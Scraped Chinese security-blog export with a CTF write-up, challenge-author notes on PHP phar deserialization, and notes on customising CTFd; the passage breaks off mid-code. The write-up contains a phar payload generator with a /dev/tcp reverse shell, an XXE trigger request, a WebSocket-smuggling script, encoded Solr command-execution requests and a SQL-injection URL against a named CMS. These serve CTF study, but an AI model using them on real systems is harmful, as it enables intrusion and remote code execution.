$this-&gt;data = array(\"Zedd\" =&gt; \"$system\"); } }}namespace think { abstract class Model { use model\\concern\\Attribute; use model\\concern\\Conversion; }}namespace think\\model{ use think\\Model; class Pivot extends Model { public function __construct($system) { $this-&gt;get($system); } }}namespace { $Conver = new think\\model\\Pivot(\"bash -c 'sh &gt;&amp; /dev/tcp/you r_ip/port 0&gt;&amp;1'\"); $payload = new think\\process\\pipes\\Windows($Conver); ini_set('phar.readonly',0); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $phar-&gt;setMetadata($payload); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); rename('phar.phar','phar.xml');}?&gt; 传这个 xml 上去之后再发以下请求： 123456789101112131415POST /postxml HTTP/1.1Host: zedd.vv:8000User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=e4gevanqetq7dvri2q8ujh68hrUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/xml;charset=utf-8Content-Length: 229&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'phar:///tmp/uploads/28b20c7474c6127c57486e26ad1442b9/20191110/e08b7a076a3d519f8936d3d8b8c17a27.xml'&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt; 用 XXE 触发 phar 反序列化即可。 我看有些师傅还在为/readflag头疼…这也不是啥新玩意了，可以直接用trap \"\" 14就可以让验证码停下来了。 bank_serviceSecond Blood 做的还是比较有意思的一题，可惜当时做的比较zz，本来可以一血，就是因为自己弄的太不小心了。 因为之前一直在研究 HTTP Smuggling 的东西，我在腾讯的导师也对这个挺感兴趣的，前阵子给我发了一个 Websocket Smuggling 看完后一脸懵逼，文章跟之前 Black Hat 2019 HTTP Desync 那个议题一样，只说了有这么个攻击面，但是没有说怎么产生的，但是还好给了 POC 以及一些 challs ，虽然我当时复现了一下，但是依然懵逼。 直到作者终于在前几天把 websocket-smuggle 攻击原理用文章描述了出来，恰巧这次比赛也出到了这么个题目，所以看到题目用了 websocket ，我就猜可能是这个攻击面了。 这个攻击面是什么呢？帮大家一句话总结就是在 websocket 建立连接时，如果反向代理没有完全严格遵守 RFC 6445 标准，在处理Sec-WebSocket-Version 版本错误的情况并没有做好相应的处理，导致了保持了客户端与后端服务器 TCP/TLS 的连接，所以造成了我们可以进行 Smuggling 请求的攻击，这里直接表现为可以通过这种攻击访问内网。 我们再回到题目，题目的 zz 客服只会重复一句话 ​ 我们基于solr提供优质的银行信息搜索服务。 那应该就是提示 solr 了，前阵子有个 solr RCE …但是我们直接访问 solr 服务是 403 … 于是我们尝试直接用 Smuggling 探测 solr 服务 1234567891011121314151617181920212223242526272829303132333435363738import socket req1 = \"\"\"GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1Host: 47.105.57.19:3000Sec-WebSocket-Version: 1338Upgrade: websocketCookie: user=admin; io=wdvnH-5hbXMU4XPFAC_O\"\"\".replace('\\n', '\\r\\n')req2 = \"\"\"GET /solr HTTP/1.1Host: localhost:8983\"\"\".replace('\\n', '\\r\\n')def main(netloc): host, port = netloc.split(':') sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, int(port))) sock.sendall(req1) sock.recv(4096) sock.sendall(req2) # print req2 data = sock.recv(4096) data = data.decode(errors = 'ignore') print(data) data = sock.recv(4096) data = data.decode(errors = 'ignore') print(data) sock.shutdown(socket.SHUT_RDWR) sock.close()if __name__ == \"__main__\": main('47.105.57.19:3000') 发现是个302跳转… 看来还是得起本地环境来试试看，刚好 vulhub 有一个环境（p牛辣是真的牛批 直接起起来，然后发现 solr 的入口是 /solr/#/ ，然后我们把 req2 的请求部分改成 /solr/#/就可以看到页面内容了 1234req2 = \"\"\"GET /solr/#/ HTTP/1.1Host: localhost:8983\"\"\".replace('\\n', '\\r\\n') 可惜这个 Smuggling 技术貌似没有直接能像代理一样的功能，不能用浏览器直接浏览内容，每次只能自己去分析回显，不过这个题也不需要用到渲染交互什么的，直接都是可以发送 api 请求的。 于是我们本地起环境，用 Github 上几个 exp 试了一下，发现有外连的我本地可以成功，但是打远程不行… 然后我仔细看了 solr_exploit poc 以及 PoC第三阶段–无外连+有回显，想必应该就是这个了吧，后来给出的 hint 也验证了这一点，就是需要构造那篇文章当中打了码的 POC (又是一个看图猜 POC 的题，我要吐了 侧信道攻击于是我拿着这个图找了一些 PS 大神进行处理，结果淘宝卖家说我是第四个找他们处理的人了.jpg 于是开始了漫漫 POC 猜测之路，首先我们看图可以发现图中有两个蓝色的快，那么第一行有没有可能是: 1&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; 让我们试试看，把 burp 与文章 burp 拉到同样高度，然后 xml 标签之后随便弄几个 payload 我靠，简直一毛一样 XD 我感觉我要一血了，侧信道攻击真的牛批。然而正如上图，他喵的还是没回显啊… Emmm….陷入沉思 稍加思索在 github 那个 repo 中我们可以发现其实检测漏洞 - Exploit2用的也是 @Longofo 师傅在那篇文章说的 ContentStreamSource ​ 在相关概念中说到了ContentStreamDataSource能接收Post数据作为数据源，结合第一阶段说到的dynamicField就能实现回显了。 一开始不熟悉 java 的我看到这也很懵逼，怎么就能实现回显了…然后我们可以看看那个 github repo exp2，我也着实看了好久 在我用这个 exp2 的第四步，也就是开启远程流这个步骤，如果直接按照这个做法的话，是直接得到了 403 Forbidden ​ 该步骤是为了修改configoverlay.json文件中的配置 以启用远程流的相关选项 .enableStreamBody .enableRemoteStreaming 替换tika为索引库名称 12345678POST /solr/tika/config HTTP/1.1Host: 127.0.0.1Accept: */*Content-type:application/jsonContent-Length: 159Connection: close{\"set-property\": {\"requestDispatcher.requestParsers.enableRemoteStreaming\": true}, \"set-property\": {\"requestDispatcher.requestParsers.enableStreamBody\": true}} 响应200即成功(实际测试 8.1可以成功) 响应500即失败(实际测试 某些低版本会失败) 所以我们不得不只能走另一种方式，不用开启 streambody 的方法。 然后开始了漫长的 fuzz 过程，可能我理解得比较慢，导致做的也比较慢，这里我们可以看到这个利用 streambody 构造的 POC 1234567891011121314151617181920POST /solr/tika/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=tika&amp;name=dataimport&amp;dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%66%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1Host: solr.com:8983User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://solr.com:8983/solr/Content-Length: 212content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f--------------------------aceb88c2159f183fContent-Disposition: form-data; name=\"stream.body\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;RDF&gt;&lt;item/&gt;&lt;/RDF&gt;--------------------------aceb88c2159f183f-- 其中 urlencode 部分是： 1234567891011121314151617181920212223242526272829303132333435&lt;dataConfig&gt;&lt;dataSource name=\"streamsrc\" type=\"ContentStreamDataSource\" loggerLevel=\"TRACE\" /&gt; &lt;script&gt;&lt;![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"ifconfig\").getInputStream()));var result = [];while(true) {var oneline = bufReader.readLine();result.push( oneline );if(!oneline) break;}row.put(\"title\",result.join(\"\\n\\r\"));return row;}]]&gt;&lt;/script&gt;&lt;document&gt; &lt;entity stream=\"true\" name=\"entity1\" datasource=\"streamsrc1\" processor=\"XPathEntityProcessor\" rootEntity=\"true\" forEach=\"/RDF/item\" transformer=\"script:poc\"&gt; &lt;field column=\"title\" xpath=\"/RDF/item/title\" /&gt; &lt;/entity&gt;&lt;/document&gt;&lt;/dataConfig&gt; 利用 ContentStreamDataSource 把 stream.body 作为数据源进行处理。其实看到这，再根据文章中所描述的： ​ 在相关概念中说到了ContentStreamDataSource能接收Post数据作为数据源，结合第一阶段说到的dynamicField就能实现回显了。 其实我们的 POC 也呼之欲出了。 只要去掉 stream.body ，使用 POST XML 作为数据源，再配合 dynamicField 的特性，就可以把回显输出到 document 当中了。 于是我们可以大概这么去构造 dataConfig 123456789101112131415161718192021222324252627282930313233&lt;dataConfig&gt;&lt;dataSource name=\"streamsrc\" type=\"ContentStreamDataSource\" loggerLevel=\"TRACE\" /&gt; &lt;script&gt;&lt;![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"ls\").getInputStream()));var result = [];while(true) {var oneline = bufReader.readLine();result.push( oneline );if(!oneline) break;}row.put(\"id\",result.join(\"\\n\\r\"));return row;}]]&gt;&lt;/script&gt;&lt;document&gt; &lt;entity name=\"streamxml\" datasource=\"streamsrc1\" processor=\"XPathEntityProcessor\" forEach=\"/RDF/item\" transformer=\"script:poc\"&gt; &lt;field column=\"id\" xpath=\"/RDF/item/id\" name=\"id_s\" type=\"string\"/&gt; &lt;/entity&gt;&lt;/document&gt;&lt;/dataConfig&gt; 直接利用默认配置的 id fileld 进行回显，然后将之前 stream body 的改成 xml 发送 post 请求即可。 12345678910111213POST /solr/test1/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=test1&amp;name=dataimport&amp;dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22ls%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22id%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20name%3D%22streamxml%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22id%22%20xpath%3D%22%2FRDF%2Fitem%2Fid%22%20name%3D%22id_s%22%20type%3D%22string%22%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1Host: zedd.vv:8983User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Length: 62Content-Type: application/xml;charset=utf-8&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;RDF&gt;&lt;item/&gt;&lt;/RDF&gt; 这样我们就成功构造了回显，然后用 smuggling 方法发送上面的请求就可以了。 给比我做的快的师傅递茶tql，自己还是做的太慢了orz… 文中的POC仅供本次做题学习交流，切勿用于非法用途 easyweb当时做完 bank_service 就去睡了，第二天醒来就结束就没看这道题，后来问了问前几的师傅们，是个 sql 注入的题。 一个CMS，官网是行云海CMS，题目是最新的版本，然后我去看了一下，主要问题在App/Api/Controller/LtController.class.php当中，有好几个地方，比如 123456public function gbooklist() { ...true$order_by = I('orderby', 'id DESC'); ...true$_list = M('guestbook')-&gt;where($where)-&gt;order($order_by)-&gt;limit($limit)-&gt;select();} 对于 I 函数第二个参数并没有做任何的处理 123456789101112131415/** * 获取输入参数 支持过滤和默认值 * 使用方法: * &lt;code&gt; * I('id',0); 获取id参数 自动判断get或者post * I('post.name','','htmlspecialchars'); 获取$_POST['name'] * I('get.'); 获取$_GET * &lt;/code&gt; * @param string $name 变量的名称 支持指定类型 * @param mixed $default 不存在的时候默认值 * @param mixed $filter 参数过滤方法 * @param mixed $datas 要获取的额外数据源 * @return mixed */function I($name,$default='',$filter=null,$datas=null) 于是我们可以访问index.php?s=Api/lt/gbooklist&amp;orderby=1;SELECT SLEEP(5)%23得到明显的时间延迟，这里我们就可以直接用 sqlmap 时间盲注就行了。 同样的，该文件里的taglist/alist/slist/reviewlist函数都有相同的地方存在注入，该题的 flag 也在数据库里面，所以用 sqlmap 跑跑就出来了。 文中的POC仅供本次做题学习交流，切勿用于非法用途","link":"/2019/11/13/Red-Hat-2019/"},{"title":"SUCTF 2019 出题笔记 & phar 反序列化的一些拓展","text":"这次我给 SUCTF 出了三道 Web，分别是 CheckIn 、 pythonginx 、 Upload Labs 2，下面聊一下出题时候的一些思路以及随想，还有最近对于 phar 的一些深入挖掘。 文章首发于先知社区：https://xz.aliyun.com/t/6057 CheckIn关于 CheckIn 这道题，是我在看 php 文档时候翻到的一个关于 .user.ini 的说明，然后参考了 user.ini文件构成的PHP后门，因为是比较久远的东西了，而且我看很多什么上传教程，甚至我认为总结比较全面的 upload labs 都未曾提及到这个 trick ，而且回忆了一下以及粗略搜了一下，都没有发现有过 CTF 出过这个 trick ，但是又比较简单，我猜肯定还有些人并不知道这个 trick ，所以就放在了 web1 作为签到的题目。 出题的时候直接拿了国赛华东北赛区一个题目源码来改的，原本是想直接 ban 掉htaccess的，节省大家的时间，不要让大家的思路跑偏。结果打错了成了htacess…然后就有一群师傅跑偏了…又因为权限的问题还被搅屎了…给师傅们谢罪了哐哐哐 pythonginxpythonginx 没什么特别好说的…是我思维太局限了…导致变成了猜 flag 位置的题，这题我是我前几天在 black hat 上看到 us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf 一个比较好玩的东西，正好拿来出题分享给大家，出题思路在于用 ℆ 这个字符去读取 /user目录下的敏感文件。 Upload Labs 2其实这题最后 admin.php 应该用的__wakeup…不应该用的__destruct…自己半夜出题不是很清醒…验题的师傅也没看出问题，搞得考察的最后一环就没了… 这题其实琢磨了挺久，但是由于没有想到有什么好的 pop 链，就出题出成了这个亚子… FINFO_FILE最近研究了一波 phar 的反序列化，看了比较多的文章，其中我觉得写的很棒，对 CTFer 特别有用的就是 @seaii 的文章 利用 phar 拓展 php 反序列化漏洞攻击面 &amp; @zsx 的文章 Phar与Stream Wrapper造成PHP RCE的深入挖掘，通过在这两篇文章的揭露，我们可以发掘到比较多的函数，当我在自己进行研究的时候，发现了 finfo_file/finfo_buffer/mime_content_type 均通过_php_finfo_get_type间接调用了关键函数php_stream_open_wrapper_ex，导致均可以使用phar://触发 phar 反序列化，所以这里我选择了finfo_file作为 phar 反序列化的触发函数。 三个函数在 fileinfo.c 599 行中 通过 _php_finfo_get_type 定义，在 552 行中 _php_finfo_get_types 调用了 php_stream_open_wrapper_ex， php://filter触发函数有了，那么接下里就是触发条件了。既然是与文件有关的函数均能触发 phar 反序列化，那么伪协议呢？ 通过 @zsx 师傅的挖掘，发现基本上大多数 PHP stream 都可以通过 phar:// 来触发，但是就是没有提及 php:// 伪协议。 So，让我们用最常见的 php://filter/read=convert.base64-encode/resource=试一下 好的，那么再看看文件包含如何 一点也不意外，我们可以通过 php://filter 来绕过一些开头限制进行 phar 反序列化 XXE 2 phar还有以及神秘的 config.php 只有这么一句话： 1libxml_disable_entity_loader(true); 禁用了外部实体，虽然题目给出的反射类确实可以反射，而且也可以进行 XXE，也有过相关的 CTF题 Annoying class，虽然控制了 /flag 读取权限，可是为什么还要禁用外部实体呢？难不成 XXE 也可以反序列化？ Test.xml 中的内容就是上面 $xml的内容 当然 php://filter 在这里也适用 Mysql而后就是 admin.php 中令人异常疑惑的四段代码了： 1234567891011$reflect = new ReflectionClass($this-&gt;clazz);$this-&gt;instance = $reflect-&gt;newInstanceArgs();$reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1);$reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2);$reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3); 有什么用呢？当然如果出题人xx地用__destruct自然没什么用，如果用__wakeup，自然得想办法去触发反序列化。然而这四段代码其实正好对应了： 1234$m = new mysqli();$m-&gt;init();$m-&gt;real_connect('ip','select 1','select 1','select 1',3306);$m-&gt;query('select 1;'); 其实也就是 @LoRexxar’ 在 Tsec 上进行的分享 Comprehensive analysis of the mysql client attack chain 的内容了，@zsx 文章中指出 既然可以这么触发，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。 1234567891011$reflect = new ReflectionClass('Mysqli');$sql = $reflect-&gt;newInstanceArgs();$reflectionMethod = new ReflectionMethod('Mysqli', 'init');$reflectionMethod-&gt;invoke($sql, $arr);$reflectionMethod = new ReflectionMethod('Mysqli', 'real_connect');$reflectionMethod-&gt;invoke($sql, 'ip','root','123456','test','3306');$reflectionMethod = new ReflectionMethod('Mysqli', 'query');$reflectionMethod-&gt;invoke($sql, 'select 1'); Bonus: PHP is the best!mysqli-&gt;real_connect() overwrites MYSQLI_OPT_LOCAL_INFILE setting Something总之，这个题目我先分享给大家的点就是这些了，这个题我自己认为自己出的也不是很好，整个构造链没有设计的特别好，参考了比较多的题，比如 2018 N1CTF easy &amp; hard php，2018 LCTF T4lk 1s ch34p,sh0w m3 the sh31l 等等赛题，我觉得这些都是很优质的赛题，我也想向这些赛题去努力，可惜由于自己的知识面以及知识深度的不够，还不能做到那种赛题的程度，尤其是 @K0rz3n 师傅的出题 [blog]([https://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20详细分析/](https://www.k0rz3n.com/2018/11/19/LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析/)) ，我前前前后后读了很多遍，最后还是没有做到像 @K0rz3n &amp; @wupco 师傅那样的出题深度，难以望其项背。 Conclusion最后，如果有小伙伴希望与我一起交流探索 phar 的一些小 trick 或者交流一些其他知识，欢迎来信：zeddyu.lu#gmail.com，如果大家有意愿加入 SU，也欢迎来信到：suers_xctf#126.com 最后的最后，很感谢大家的不杀之恩，这次 SUCTF 的举办主要依靠的是新一代队员的努力，由于新一代队员在运维、出题方面经验都不是特别老道，所以在比赛过程中产生了些许意外 &amp; 失误，希望大家多多见谅，在这里给体验不好的师傅们谢罪了，哐哐哐，但是我们也会向着更好的方向努力，带给师傅们更好的比赛体验。 像《头号玩家》里面的一句话一样，感谢大家抽时间来打我们的比赛！","link":"/2019/08/24/SUCTF-2019/"},{"title":"SUCTF五校联合招新赛小记","text":"SUCTF五校联合招新赛已经过去几天了。现在从主办方的角度来写写我第一次办比赛整个过程吧… 首先本次比赛是江苏高校信息安全联盟SU内东南大学、南京航空航天大学、南京理工大学、三江学院、金陵科技学院五校联合举办的队内招新赛，原本计划是出题给萌新做的，结果到后面是题目越来越难2333…感觉内部出题也形成了一定的竞争，然后结果就不提了，变成了大佬屠榜赛。 数据本次比赛由于最后放的调查问卷，而且收集到的调查问卷远远达到签到题得分人数，姑且用来做个大概的分析吧。 首先是本次参赛人数，注册人数达到了463个队，最后调查问卷填写人数为81个队。五个学校的学校数据就不分析了，其中其他学校占到了242个队，基本变成了半公开赛…但是由于还是想保护萌新，就没有变成完全的公开赛。否则我担心会被日穿… 第一天开赛的情况，由于docker环境没配置好，导致有一题pwn直接被打穿了，还被改了flag，大师傅们真的tql… 年级所占比例: 比赛难度调查统计： 时间安排调查统计： 比赛题目调查统计：比赛评分调查统计(满分5分)： 以上数据均由比赛调查问卷数据统计得出。 整个比赛历时7天，从2018/11/7 10:00:00 CST – 2018/11/14 10:00:00 CST，比赛期间无暂停，总共放出题目40道题，其中pwn类7道，web类14道，rev类8道，misc类11道。并没有无人做出的题目。 Preparation起初要搞SUCTF联合招新其实在开学初貌似就在SU内部群就提出来了，因为之前2016年也有过SUCTF类似的联合招新赛，当时徐院长还是作为美女客服的时候，当时我还对着徐院长的头像一脸懵逼的时候。 结果拖到了10月底这样然后才真正搞起来，拉了小群然后开始计划出题，我也就才去拉赞助。于是乎，长亭、赛宁双方这边我谈的都不是很顺利，主要也是由于第一次拉赞助，没有写proposal，进度就一直拖慢了挺多的，而且跟白师傅那边要机器也没沟通顺利，平台自己也并没有很及时地搭建起来。然后在这一切的原因之下，导致了比赛只能往后推了两天，由原计划的11/5推到了11/7，由于自己也是第一次改CTFd，改的也比较慢，于是乎我记得直到11/7日凌晨我依然还在改平台。 然后11/5晚上这样整合题目的时候，由于各个师傅用出题模版理解不太一样，也怪自己没有让各位师傅开个小会啥的强调一下出题模板，导致整合题目的时候还有一堆格式不对的题目模板，也统统全部都让出题人规范了，也耗费了白师傅不少精力去改这些题目。 这里主要记录下我这边改CTFd的经历吧，我看网络上也并没有详细的更改CTFd的流程。 CTFd首先明确一下自己的需求： 在注册界面提供学校的下拉框选择 在得分榜显示学校 更改主页添加赞助商信息 虽然只是这简简单单的几个需求，也把我这个不太熟悉flask的人折腾了好一阵子。我的操作环境在Ubuntu 16.04下完成的。首先参照CTFd官方仓库文档进行安装，这几步也比较简单。 接着我们可以直接现在CTFd/themes/core/templates/register.html中加入对应的片段，对应的option对应的value可以是中文。123&lt;select class=\"form-control input-filled-valid\" name=\"school\" id=\"school-input\"&gt;true&lt;option value=\"xx大学\"&gt;xx大学&lt;/option&gt;&lt;/select&gt; 其次我们需要在models.py中找到对应的Class Teams，这里初始化了队伍的一些信息，所以我们这里再加上一个school成员就好1school = db.Column(db.String(128))之后初始化的时候，我一直对于C的多重构造一直耿耿于怀，想着这里初始化Teams的时候也根据参数的个数不同使用不同的构造方法，这样可以不用修改原来是用的构造方法，查阅资料发现可以这么写。123456789101112131415import timeclass Date: \"\"\"方法一：使用类方法\"\"\" # Primary constructor def __init__(self, year, month, day): self.year = year self.month = month self.day = day # Alternate constructor @classmethod def today(cls): t = time.localtime() return cls(t.tm_year, t.tm_mon, t.tm_mday)虽然可以这么写，但是我在弄排行榜的时候，第一次访问有新队伍的排行榜总会报错。1'unicode' object has no attribute 'label'注册队伍老是不能把学校写进sqlite，这就很烦了。而且第一次注册的时候老是报错，结果最后询问了东大的师傅，他们的写法是在models.py给class Teams加入school成员后，在auth.py下的register方法中，这么写1234567891011school = request.form['school'] #获取school参数...if len(errors) &gt; 0: return render_template('register.html',errors=errors,name=request.form['name'],email=request.form['email'],password=request.form['password'])else: with app.app_context(): team = Teams(name, email.lower(), password) team.school = shcool #直接让school参数赋值给school成员变量 db.session.add(team) db.session.commit() db.session.flush()使用原来的构造方法，这个问题就解决了…2333解决了注册的问题，排行榜的显示也就比较简单了，首先改CTFd/themes/core/templates/scoreboard.html中的模版代码123456789101112131415161718192021222324&lt;div id=\"scoreboard\" class=\"row\"&gt;truetrue&lt;div class=\"col-md-12\"&gt;truetruetrue&lt;table class=\"table table-striped\"&gt;truetruetruetrue&lt;thead&gt;truetruetruetruetrue&lt;tr&gt;truetruetruetruetruetrue&lt;td scope=\"col\" width=\"10px\"&gt;&lt;b&gt;Place&lt;/b&gt;&lt;/td&gt;truetruetruetruetruetrue&lt;td scope=\"col\"&gt;&lt;b&gt;Team&lt;/b&gt;&lt;/td&gt;truetruetruetruetrue &lt;td scope=\"col\"&gt;&lt;b&gt;School&lt;/b&gt;&lt;/td&gt; //加入School表头truetruetruetruetruetrue&lt;td scope=\"col\"&gt;&lt;b&gt;Score&lt;/b&gt;&lt;/td&gt;truetruetruetruetrue&lt;/tr&gt;truetruetruetrue&lt;/thead&gt;truetruetruetrue&lt;tbody&gt;truetruetruetrue{% for team in teams %}truetruetruetruetrue&lt;tr&gt;truetruetruetruetruetrue&lt;th scope=\"row\" class=\"text-center\"&gt;{{ loop.index }}&lt;/th&gt;truetruetruetruetruetrue&lt;td&gt;&lt;a href=\"{{ request.script_root }}/team/{{ team.teamid }}\"&gt;{{ team.name | truncate(50) }}&lt;/a&gt;&lt;/td&gt;truetruetruetruetruetrue&lt;td&gt;{{ team.school }}&lt;/td&gt; //加入team.school内容truetruetruetruetruetrue&lt;td&gt;{{ team.score }}&lt;/td&gt;truetruetruetruetrue&lt;/tr&gt;truetruetruetrue{% endfor %}truetruetruetrue&lt;/tbody&gt;truetruetrue&lt;/table&gt;truetrue&lt;/div&gt;true&lt;/div&gt;接下来把就去scoreboard.py获取team.school,通过大概的猜测以及推断，我们可以带改知道从这里修改:12345678910111213141516171819if admin: standings_query = db.session.query( Teams.id.label('teamid'), Teams.name.label('name'), Teams.school.label('school'), Teams.banned, sumscores.columns.score )\\ .join(sumscores, Teams.id == sumscores.columns.teamid) \\ .order_by(sumscores.columns.score.desc(), sumscores.columns.id) else: standings_query = 